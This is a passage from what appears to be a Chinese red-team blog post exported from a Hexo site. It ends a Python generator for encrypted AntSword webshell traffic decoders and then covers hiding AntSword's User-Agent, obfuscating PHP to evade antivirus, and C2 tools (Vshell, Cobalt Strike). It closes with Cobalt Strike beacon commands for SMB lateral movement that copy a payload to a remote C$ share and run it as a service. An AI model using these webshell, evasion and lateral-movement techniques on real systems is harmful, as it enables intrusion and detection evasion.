&#x27;&#123;key&#125;&#x27;;</span></span><br><span class="line"><span class="string">const IV = Buffer.from(&#x27;&#123;iv&#125;&#x27;, &#x27;hex&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = &#123;&#123;</span></span><br><span class="line"><span class="string">    asoutput: () =&gt; &quot;&#123;php_encrypt_clean&#125;&quot;&quot;,</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    decode_buff: (buff) =&gt; &#123;&#123;</span></span><br><span class="line"><span class="string">        const encrypted = Buffer.from(buff.toString(), &#x27;&#123;encode_final&#125;&#x27;);</span></span><br><span class="line"><span class="string">        const decipher = crypto.createDecipheriv(&#x27;&#123;algorithm&#125;&#x27;, ENCRYPTION_KEY, IV);</span></span><br><span class="line"><span class="string">        let decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);</span></span><br><span class="line"><span class="string">        // 去除PKCS7填充</span></span><br><span class="line"><span class="string">        const pad = decrypted[decrypted.length - 1];</span></span><br><span class="line"><span class="string">        return decrypted.slice(0, decrypted.length - pad);</span></span><br><span class="line"><span class="string">    &#125;&#125;</span></span><br><span class="line"><span class="string">&#125;&#125;;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        algorithm=algorithm,</span><br><span class="line">        key_length=key_length,</span><br><span class="line">        iv_length=iv_length,</span><br><span class="line">        key=key,</span><br><span class="line">        iv=iv,</span><br><span class="line">        php_encrypt_clean=php_encrypt_clean,</span><br><span class="line">        encode_final=encode_final</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(js_script)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;script_path&quot;</span>: output_file,</span><br><span class="line">        <span class="string">&quot;algorithm&quot;</span>: algorithm,</span><br><span class="line">        <span class="string">&quot;key&quot;</span>: key,</span><br><span class="line">        <span class="string">&quot;iv&quot;</span>: iv,</span><br><span class="line">        <span class="string">&quot;key_length&quot;</span>: <span class="built_in">str</span>(key_length),</span><br><span class="line">        <span class="string">&quot;iv_length&quot;</span>: <span class="built_in">str</span>(iv_length),</span><br><span class="line">        <span class="string">&quot;encode&quot;</span>: encode_final</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;加密脚本生成器 - 用于生成PHP加密和JS解密的配套脚本&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;--algorithm&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;aes-256-cbc&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">f&quot;加密算法，支持: aes-128-cbc, aes-192-cbc, aes-256-cbc, aes-128-gcm, aes-192-gcm, aes-256-gcm, des-ede3-cbc (默认: aes-256-cbc)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-k&quot;</span>, <span class="string">&quot;--key&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;自定义密钥（不指定则自动生成）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--iv&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;自定义向量（十六进制字符串，不指定则自动生成）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-kl&quot;</span>, <span class="string">&quot;--key-length&quot;</span>, </span><br><span class="line">                      <span class="built_in">type</span>=<span class="built_in">int</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;密钥长度（字节，不指定则根据算法自动推断）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-il&quot;</span>, <span class="string">&quot;--iv-length&quot;</span>, </span><br><span class="line">                      <span class="built_in">type</span>=<span class="built_in">int</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;向量长度（字节，不指定则根据算法自动推断）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-e&quot;</span>, <span class="string">&quot;--encode&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;base64&quot;</span>, </span><br><span class="line">                      choices=[<span class="string">&quot;base64&quot;</span>, <span class="string">&quot;hex&quot;</span>], </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;最终编码方式（base64/hex，默认: base64）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;encryption.js&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;输出脚本文件名（默认: encryption.js）&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = generate_encryption_script(</span><br><span class="line">            algorithm=args.algorithm,</span><br><span class="line">            key=args.key,</span><br><span class="line">            iv=args.iv,</span><br><span class="line">            key_length=args.key_length,</span><br><span class="line">            iv_length=args.iv_length,</span><br><span class="line">            encode_final=args.encode,</span><br><span class="line">            output_file=args.output</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;加密脚本生成成功！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;脚本路径: <span class="subst">&#123;result[<span class="string">&#x27;script_path&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;加密算法: <span class="subst">&#123;result[<span class="string">&#x27;algorithm&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密钥: <span class="subst">&#123;result[<span class="string">&#x27;key&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;向量(hex): <span class="subst">&#123;result[<span class="string">&#x27;iv&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密钥长度: <span class="subst">&#123;result[<span class="string">&#x27;key_length&#x27;</span>]&#125;</span>字节&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;向量长度: <span class="subst">&#123;result[<span class="string">&#x27;iv_length&#x27;</span>]&#125;</span>字节&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;最终编码: <span class="subst">&#123;result[<span class="string">&#x27;encode&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;注意：请妥善保存密钥和向量，服务端需使用相同配置解密！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;生成失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">encryption.js: 对命令结果进行加密进行传输，客户端拿到之后进行解密。在AntSword上新增解码器，内容复制进去。</span><br></pre></td></tr></table></figure>

 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">######################### User-Agent #########################</span><br><span class="line">antSword-2.1.15/modules/update.js: 将&quot;User-Agent: antSword/v2.0&quot;改为Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>代码免杀</p>
 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PHP代码在线混淆&amp;加密：https://www.toolfk.com/zh-CN/tools/convert-php.html、https://murk.xiaojieapi.com/#、https://uutool.cn/php/</span><br></pre></td></tr></table></figure>
</li>
<li><p>行为免杀</p>
</li>
</ol>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h2><h3 id="Vshell"><a href="#Vshell" class="headerlink" title="Vshell"></a>Vshell</h3><p>国产自研C2工具，客户端为WEB形式，在闲鱼上买</p>
<h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><p>老牌工具，特征较多，需要魔改，Linux兼容较少</p>
<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="SMB-CS"><a href="#SMB-CS" class="headerlink" title="SMB-CS"></a>SMB-CS</h3><ol>
<li><p>新增一个用户接收SMB通信监听器</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010210705756.png" alt="image-20251010210705756"></p>
</li>
<li><p>生成一个基于SMB通信的beacon</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010210749738.png" alt="image-20251010210749738"></p>
</li>
<li><p>通过肉鸡将beacon上传到靶标上，并且触发执行 &amp;&amp; 操控肉鸡主动连接smb-beacon，完成链路搭建</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211001369.png" alt="image-20251010211001369"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell copy smb_update.exe \\owa.god.org\c$</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell sc \\owa.god.org create SMBupdate binpath= <span class="string">&quot;cmd.exe /c c:\smb_update.exe&quot;</span></span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell sc \\owa.god.org start SMBupdate</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash"><span class="built_in">link</span> owa.god.org</span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211458999.png" alt="image-20251010211458999"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>APT</tag>
        <tag>红队</tag>
        <tag>渗透</tag>
        <tag>web</tag>
        <tag>内网</tag>
      </tags>
  </entry>
</search>
